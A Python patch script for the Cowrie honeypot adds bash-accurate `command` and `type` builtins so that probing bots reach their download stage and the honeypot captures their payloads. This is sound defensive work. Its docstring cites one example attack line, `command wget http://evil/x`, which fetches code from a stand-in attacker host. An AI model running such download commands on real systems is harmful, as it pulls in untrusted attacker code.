#!/usr/bin/env python3
"""Patch cowrie/commands/which.py: add the `command` and `type` builtins.

WHY (measured on the arm deployment): 482 bot probes failed on
`command -v python3` / `! command -v curl` — the tool-presence gate a large
family runs BEFORE its download stage. Cowrie ships neither `command` nor
`type`, so the gate errored and the bot disengaged without dropping a payload.
The fake filesystem already contains /usr/bin/{python3,curl,wget,perl,...}, so
the tools "exist"; only the resolver was missing. Closing this gate is the
single highest-value capture fix — it lets the profiler family proceed to the
download ShardLure captures.

`which` is the natural home: same name-resolution family, already in
command_modules, so no edit to the module list.

Behaviour (byte-matched to bash 5.1.16 on ubuntu:22.04). A name resolves as
bash looks it up: reserved word, then builtin, then each file on $PATH.
  command -v NAME.. -> the word for a keyword/builtin, else the path; nothing
                       for a missing name; exit 0 if any name resolved.
  command -V NAME.. -> "NAME is a shell keyword|builtin" / "NAME is /path";
                       "command: NAME: not found" on stderr for a missing one.
  type [-a] NAME..  -> like `command -V` (-a: every match); exit 1 if any name
                       is missing ("type: NAME: not found").
  type -t|-p|-P     -> kind word / path when a file / path search only.
  bad option        -> bash's "invalid option" + usage line, exit 2.
  command NAME ARGS -> DELEGATES to the real command via getCommand +
                       exec_command (v3.1.1's sudo.py/busybox.py pattern).
                       Without this a bot doing `command wget http://evil/x`
                       would silently no-op instead of downloading — worse for
                       capture than the bug.

v3.1.1 port (payload-yield Phase B Task 3): the pin-era version passed
--check on v3.1.1 and then crashed every session that used it. v3.1.1's
getCommand takes a cwd (`getCommand(self, cmd, paths, cwd)`, shell/protocol.py),
commands carry their own `self.cwd`, and `protocol.pp.insert_command` is gone,
so `command -v wget` raised TypeError and hung the session until the client
gave up. A text check cannot see that; scripts/behaviour's command-v-wget and
type-wget cases can. Errors now use the shell's own prefix ("bash: line 1: "
for an exec channel), as bash -c does.

Builtins first (payload-yield Phase B Task 7, Task 3 review M-1): bash answers
`command -v echo` with `echo` and `type echo` with "echo is a shell builtin";
this patch searched PATH first and printed /usr/bin/echo, and it called any
name in Cowrie's command registry with no file on PATH a "shell builtin"
(`type sudo` -> "sudo is a shell builtin"). Now only bash's own keywords and
builtins are reported as such, and every other name is looked up on the fake
PATH alone; plant_bait_files gives the pickle the tools a 22.04 server ships
(sudo, crontab, ping, git...) that it lacked. Several names per call, -a/-p/-P
and the exit statuses follow bash (scripts/behaviour command-type-builtin,
type-a-echo).
"""
import sys
from pathlib import Path


# which.py's registry line after the two blank lines that end Command_which.
# NEW puts the registrations under a comment line, so OLD does not survive
# inside NEW and the pristine/patched/partial states stay distinct. Leaving
# Command_which's body alone keeps this clear of a later which-first patch.
OLD = """

commands["which"] = Command_which
"""

NEW = r'''

# --- ShardLure stealth: `command` and `type` builtins -----------------------
# See install/persona/patches/command-type-builtins.py for the why (the 482-fail
# download gate). A name resolves as bash resolves it: keyword, builtin, then
# the files on $PATH in the fake FS, so a tool present there reports present.
from cowrie.shell.pipe import PipeProtocol  # noqa: E402


# bash 5.1.16's reserved words and builtins, as `compgen -k` and `compgen -b`
# list them on ubuntu:22.04. bash looks a name up as a keyword, then a builtin,
# then on $PATH, so `command -v echo` prints `echo` and `type echo` says "echo
# is a shell builtin" although /usr/bin/echo exists (Task 3 review M-1).
BASH_KEYWORDS = frozenset(
    "if then else elif fi case esac for select while until do done in function"
    " time { } ! [[ ]] coproc".split()
)
BASH_BUILTINS = frozenset(
    ". : [ alias bg bind break builtin caller cd command compgen complete compopt"
    " continue declare dirs disown echo enable eval exec exit export false fc fg"
    " getopts hash help history jobs kill let local logout mapfile popd printf"
    " pushd pwd read readarray readonly return set shift shopt source suspend test"
    " times trap true type typeset ulimit umask unalias unset wait".split()
)
# `command -p`: confstr(_CS_PATH), `getconf PATH` on glibc.
DEFAULT_PATH = "/bin:/usr/bin"


def _executable(cmd, path):
    """bash's lookup test: a regular file with an execute bit (as root, any
    of the three). `command -v /etc/passwd` is not found, and PATH=/etc:...
    skips /etc/passwd for /usr/bin/passwd (Task 7 review m-1)."""
    from cowrie.shell.fs import A_MODE

    if not cmd.fs.isfile(path):
        return False
    node = cmd.fs.getfile(path)
    return node is not None and bool(node[A_MODE] & 0o111)


def _path_hits(cmd, name, path=None):
    """Every file NAME names on PATH, in PATH order (`type -a` lists them all)."""
    hits = []
    for p in (cmd.environ.get("PATH", "") if path is None else path).split(":"):
        if not p:
            continue
        cand = cmd.fs.resolve_path(name, p)
        if _executable(cmd, cand):
            hits.append(cand)
    return hits


def _resolutions(cmd, name, files_only=False, path=None):
    """How bash resolves NAME, in its order: [(kind, text)].

    kind is "keyword", "builtin" or "file"; text is the file's path (a name
    with a slash is printed as given, as bash does). Only what is really
    there: a command Cowrie emulates with no file on PATH is not found, as on
    a 22.04 box without it (the pickle carries the tools a server has).
    """
    if "/" in name:
        if _executable(cmd, cmd.fs.resolve_path(name, cmd.cwd)):
            return [("file", name)]
        return []
    found = []
    if not files_only:
        if name in BASH_KEYWORDS:
            found.append(("keyword", name))
        if name in BASH_BUILTINS:
            found.append(("builtin", name))
    found.extend(("file", hit) for hit in _path_hits(cmd, name, path))
    return found


def _describe(name, kind, text):
    if kind == "keyword":
        return f"{name} is a shell keyword"
    if kind == "builtin":
        return f"{name} is a shell builtin"
    return f"{name} is {text}"


def _parse_options(cmd, builtin, letters, usage):
    """bash's internal_getopt over the leading options: (flags, names), or
    None after bash's invalid-option error (exit 2)."""
    args = list(cmd.args)
    flags = set()
    while args and args[0].startswith("-") and args[0] != "-":
        opt = args.pop(0)
        if opt == "--":
            break
        for ch in opt[1:]:
            if ch not in letters:
                cmd.errorWrite(f"{cmd.shell.error_prefix()}{builtin}: -{ch}: invalid option\n"
                               f"{builtin}: usage: {usage}\n")
                cmd.exit(2)
                return None
            flags.add(ch)
    return flags, args


class Command_command(HoneyPotCommand):
    resolve_args = False
    # `echo x | command cat` hands the pipe to the delegated command.
    consumes_stdin = True

    def start(self):
        parsed = _parse_options(self, "command", "pvV", "command [-pVv] command [arg ...]")
        if parsed is None:
            return
        flags, args = parsed
        path = DEFAULT_PATH if "p" in flags else None
        if "v" in flags or "V" in flags:
            # The honeypot-detection form. bash answers every name and
            # succeeds if any resolved (`command -v nope ls` is rc 0).
            found_any = False
            for name in args:
                found = _resolutions(self, name, path=path)
                if not found:
                    if "V" in flags:
                        self.errorWrite(
                            f"{self.shell.error_prefix()}command: {name}: not found\n")
                    continue
                found_any = True
                kind, text = found[0]
                if "V" in flags:
                    self.write(_describe(name, kind, text) + "\n")
                else:
                    self.write(f"{text}\n")
            self.exit(0 if found_any or not args else 1)
            return
        # Bare `command NAME ARGS...`: run the real command so a download still
        # happens, in this command's place (exec), exactly as sudo.py does.
        if not args:
            self.exit(0)
            return
        cmdclass = self.protocol.getCommand(
            args[0], (path or self.environ.get("PATH", "")).split(":"), self.cwd
        )
        if not cmdclass:
            self.errorWrite(self.shell.command_not_found_message(args[0]))
            self.exit(127)
            return
        pp = PipeProtocol(
            self.protocol,
            cmdclass,
            args[1:],
            self.input_data,
            self.pp.targets,
            cwd=self.cwd,
            user=self.user,
        )
        pp.stdin_from_pipe = self.pp.stdin_from_pipe
        self.exec_command(pp, cmdclass, *args[1:])


class Command_type(HoneyPotCommand):
    resolve_args = False

    def start(self):
        parsed = _parse_options(self, "type", "afptP", "type [-afptP] name [name ...]")
        if parsed is None:
            return
        flags, names = parsed
        missing = 0
        for name in names:
            # -P searches PATH even for a builtin; -a lists every match.
            found = _resolutions(self, name, files_only="P" in flags)
            if not found:
                if not flags & {"t", "p", "P"}:
                    self.errorWrite(f"{self.shell.error_prefix()}type: {name}: not found\n")
                missing += 1
                continue
            for kind, text in found if "a" in flags else found[:1]:
                if "t" in flags:
                    self.write(f"{kind}\n")
                elif flags & {"p", "P"}:
                    # -p prints a path only when the name is a file.
                    if kind == "file":
                        self.write(f"{text}\n")
                else:
                    self.write(_describe(name, kind, text) + "\n")
        self.exit(1 if missing else 0)


# ShardLure: register the builtins beside which (command-type-builtins.py).
commands["which"] = Command_which
commands["command"] = Command_command
commands["type"] = Command_type
'''


def main() -> int:
    args = sys.argv[1:]
    if (len(args) not in (1, 2) or not args[0] or args[0] == "--check"
            or (len(args) == 2 and args[1] != "--check")):
        print(f"usage: {Path(sys.argv[0]).name} COWRIE_HOME [--check]", file=sys.stderr)
        return 2
    path = Path(args[0]) / "src/cowrie/commands/which.py"
    content = path.read_text(encoding="utf-8")
    old_count, new_count = content.count(OLD), content.count(NEW)
    if old_count == 0 and new_count == 1:
        print(f"  [skip] {path}: already patched")
        return 0
    if old_count != 1 or new_count != 0:
        print(
            f"  [FAIL] {path}: target is neither pristine nor fully patched "
            f"(OLD={old_count}, NEW={new_count}) — upstream which.py changed",
            file=sys.stderr,
        )
        return 1
    if len(args) == 2:
        print(f"  [check] {path}: compatible")
        return 0
    path.write_text(content.replace(OLD, NEW, 1), encoding="utf-8")
    print(f"  [ok] {path}: patched (command/type builtins)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
